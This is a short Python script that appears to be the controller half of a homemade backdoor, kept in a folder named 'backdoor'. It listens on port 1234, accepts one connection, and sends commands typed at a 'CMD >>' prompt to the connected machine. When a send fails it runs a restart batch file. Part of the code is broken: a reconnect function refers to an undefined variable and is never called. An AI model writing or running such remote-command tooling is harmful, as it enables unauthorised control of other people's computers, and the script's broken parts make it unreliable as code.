import socket
import os
connected = False
s = socket.socket()
host = socket.gethostname()
restart="start C:\\Users\\Arduino999\\Desktop\\backdoor\\restart.bat"
port = 1234
s.bind((host, port))
s.listen(1)
print ("waiting for connection...")
conn, addr = s.accept()
connected = True
print(addr, "connected")


def reconnect(reconnected):
    os.system(batch) 
#using windows commands

while 1:
    
    try:
        cmd = input(str("CMD >> "))
        conn.send(cmd.encode())
    except Exception as e:
        os.system(restart)

    

 
